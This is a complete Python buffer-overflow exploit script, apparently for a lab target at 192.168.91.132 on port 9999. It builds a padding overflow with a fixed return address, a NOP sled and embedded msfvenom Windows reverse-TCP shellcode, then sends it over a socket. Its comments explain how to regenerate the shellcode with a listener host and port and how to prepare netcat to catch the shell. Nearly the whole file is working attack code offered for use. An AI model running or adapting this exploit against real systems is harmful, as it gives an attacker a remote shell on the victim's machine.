import socket

# Buffer size, return address, and NOP sled
buffer_size = 524 # Update this if necessary
return_address = b"\xf3\x12\x17\x31"  # Update this if necessary
nop_sled = b"\x90" * 32 # Update this if necessary

# Shellcode generated by MSFVENOM (ensure it is valid and free of bad characters.Must include bytes)
#example msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -f c
#copy the output and past it here. Then add "b" each of the lines
#before run ready your netcat
shellcode =(b"\xdb\xd0\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x52\xbb\xeb\x55"
b"\xa9\xdc\x83\xee\xfc\x31\x5e\x13\x03\xb5\x46\x4b\x29\xb5"
b"\x81\x09\xd2\x45\x52\x6e\x5a\xa0\x63\xae\x38\xa1\xd4\x1e"
b"\x4a\xe7\xd8\xd5\x1e\x13\x6a\x9b\xb6\x14\xdb\x16\xe1\x1b"
b"\xdc\x0b\xd1\x3a\x5e\x56\x06\x9c\x5f\x99\x5b\xdd\x98\xc4"
b"\x96\x8f\x71\x82\x05\x3f\xf5\xde\x95\xb4\x45\xce\x9d\x29"
b"\x1d\xf1\x8c\xfc\x15\xa8\x0e\xff\xfa\xc0\x06\xe7\x1f\xec"
b"\xd1\x9c\xd4\x9a\xe3\x74\x25\x62\x4f\xb9\x89\x91\x91\xfe"
b"\x2e\x4a\xe4\xf6\x4c\xf7\xff\xcd\x2f\x23\x75\xd5\x88\xa0"
b"\x2d\x31\x28\x64\xab\xb2\x26\xc1\xbf\x9c\x2a\xd4\x6c\x97"
b"\x57\x5d\x93\x77\xde\x25\xb0\x53\xba\xfe\xd9\xc2\x66\x50"
b"\xe5\x14\xc9\x0d\x43\x5f\xe4\x5a\xfe\x02\x61\xae\x33\xbc"
b"\x71\xb8\x44\xcf\x43\x67\xff\x47\xe8\xe0\xd9\x90\x0f\xdb"
b"\x9e\x0e\xee\xe4\xde\x07\x35\xb0\x8e\x3f\x9c\xb9\x44\xbf"
b"\x21\x6c\xca\xef\x8d\xdf\xab\x5f\x6e\xb0\x43\xb5\x61\xef"
b"\x74\xb6\xab\x98\x1f\x4d\x3c\x67\x77\x4f\xc3\x0f\x8a\x4f"
b"\x3c\x38\x03\xa9\x28\xa8\x42\x62\xc5\x51\xcf\xf8\x74\x9d"
b"\xc5\x85\xb7\x15\xea\x7a\x79\xde\x87\x68\xee\x2e\xd2\xd2"
b"\xb9\x31\xc8\x7a\x25\xa3\x97\x7a\x20\xd8\x0f\x2d\x65\x2e"
b"\x46\xbb\x9b\x09\xf0\xd9\x61\xcf\x3b\x59\xbe\x2c\xc5\x60"
b"\x33\x08\xe1\x72\x8d\x91\xad\x26\x41\xc4\x7b\x90\x27\xbe"
b"\xcd\x4a\xfe\x6d\x84\x1a\x87\x5d\x17\x5c\x88\x8b\xe1\x80"
b"\x39\x62\xb4\xbf\xf6\xe2\x30\xb8\xea\x92\xbf\x13\xaf\xa3"
b"\xf5\x39\x86\x2b\x50\xa8\x9a\x31\x63\x07\xd8\x4f\xe0\xad"
b"\xa1\xab\xf8\xc4\xa4\xf0\xbe\x35\xd5\x69\x2b\x39\x4a\x89"
b"\x7e")

# Construct payload
payload = b"A" * buffer_size + return_address + nop_sled + shellcode # Update this if necessary

# Debugging
print(f"[+] Payload size: {len(payload)} bytes")
print(f"[+] Sending payload...")

# Send payload
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(("192.168.91.132", 9999)) # Update this target IP and PORT
        s.send(payload)
    print("[+] Payload sent successfully!")
except Exception as e:
    print(f"[-] Connection failed: {e}")
